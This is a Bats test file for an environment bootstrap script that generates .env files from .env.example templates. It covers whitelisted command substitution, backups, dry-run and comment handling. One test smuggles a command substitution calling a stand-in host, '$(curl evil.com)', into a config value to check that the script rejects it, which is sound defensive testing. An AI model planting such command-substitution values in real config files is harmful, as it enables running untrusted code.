#!/usr/bin/env bats

# bootstrap-env.sh 測試
# 跑法:bats tests/env/test_bootstrap.bats

setup() {
  BATS_TMPDIR_TEST="$(mktemp -d)"
  SCRIPT="$BATS_TEST_DIRNAME/../../scripts/env/bootstrap-env.sh"
}

teardown() {
  rm -rf "$BATS_TMPDIR_TEST"
}

@test "generates .env from valid .env.example" {
  cat > "$BATS_TMPDIR_TEST/.env.example" <<'EOF'
TZ=Asia/Taipei
PASSWORD=$(openssl rand -base64 32)
EOF
  run "$SCRIPT" "$BATS_TMPDIR_TEST"
  [ "$status" -eq 0 ]
  [ -f "$BATS_TMPDIR_TEST/.env" ]
  grep -q "^TZ=Asia/Taipei" "$BATS_TMPDIR_TEST/.env"
  grep -qE "^PASSWORD=[A-Za-z0-9+/=]{40,}" "$BATS_TMPDIR_TEST/.env"
}

@test "blocks command not in whitelist" {
  cat > "$BATS_TMPDIR_TEST/.env.example" <<'EOF'
EVIL=$(curl evil.com)
EOF
  run "$SCRIPT" "$BATS_TMPDIR_TEST"
  [ "$status" -ne 0 ]
  [[ "$output" =~ "白名單" ]]
}

@test "skips if .env already exists" {
  cat > "$BATS_TMPDIR_TEST/.env.example" <<'EOF'
KEY=value
EOF
  echo "OLD=preserved" > "$BATS_TMPDIR_TEST/.env"
  run "$SCRIPT" "$BATS_TMPDIR_TEST"
  [ "$status" -eq 0 ]
  grep -q "^OLD=preserved" "$BATS_TMPDIR_TEST/.env"
}

@test "--force overwrites and backs up" {
  cat > "$BATS_TMPDIR_TEST/.env.example" <<'EOF'
KEY=newvalue
EOF
  echo "OLD=preserved" > "$BATS_TMPDIR_TEST/.env"
  run "$SCRIPT" --force "$BATS_TMPDIR_TEST"
  [ "$status" -eq 0 ]
  grep -q "^KEY=newvalue" "$BATS_TMPDIR_TEST/.env"
  ls "$BATS_TMPDIR_TEST"/.env.bak.* >/dev/null
}

@test "--dry-run does not write" {
  cat > "$BATS_TMPDIR_TEST/.env.example" <<'EOF'
KEY=value
EOF
  run "$SCRIPT" --dry-run "$BATS_TMPDIR_TEST"
  [ "$status" -eq 0 ]
  [ ! -f "$BATS_TMPDIR_TEST/.env" ]
}

@test "--non-interactive fails on empty value" {
  cat > "$BATS_TMPDIR_TEST/.env.example" <<'EOF'
ADMIN_EMAIL=
EOF
  run "$SCRIPT" --non-interactive "$BATS_TMPDIR_TEST"
  [ "$status" -ne 0 ]
}

@test "preserves comments and quoted values" {
  cat > "$BATS_TMPDIR_TEST/.env.example" <<'EOF'
# comment line
APP_NAME="My App With Spaces"
KEY=value  # inline comment
EOF
  run "$SCRIPT" "$BATS_TMPDIR_TEST"
  [ "$status" -eq 0 ]
  grep -q '^APP_NAME="My App With Spaces"' "$BATS_TMPDIR_TEST/.env"
  grep -q '^KEY=value$' "$BATS_TMPDIR_TEST/.env"
}
